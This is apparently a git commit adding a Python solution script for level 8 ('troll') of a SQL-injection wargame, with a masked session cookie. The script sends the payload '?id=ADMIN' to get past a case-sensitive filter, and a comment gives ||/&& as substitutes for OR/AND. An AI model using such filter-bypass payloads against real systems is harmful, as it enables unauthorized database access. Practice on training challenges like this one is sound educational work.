a167d1036f077c94feaa039142e295c8b44d6cc4
yoobi <thisisyoobi@gmail.com>
2024-01-11 22:43:53 +0900

    troll clear

---
+++ LOS/08_troll/ex.py
@@ -0,0 +1,23 @@
+#!/usr/bin/env python3
+
+'''
+# Summary
+- we can use ||, && instead of OR, AND
+'''
+
+
+import requests
+
+header = {"Cookie": "PHPSESSID=❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚;"}
+url = "https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php"
+
+payload = "?id=ADMIN"
+
+response = requests.get(url + payload, headers=header)
+
+result = response.text
+if result.find("Clear!") != -1:
+    end = result.split("Clear!")[0].split("<h2>")[1]
+    if end.find("admin") != -1:
+        end = result.split("Clear!")[0].split("<h2>")[2]
+    print(end+"Clear!")
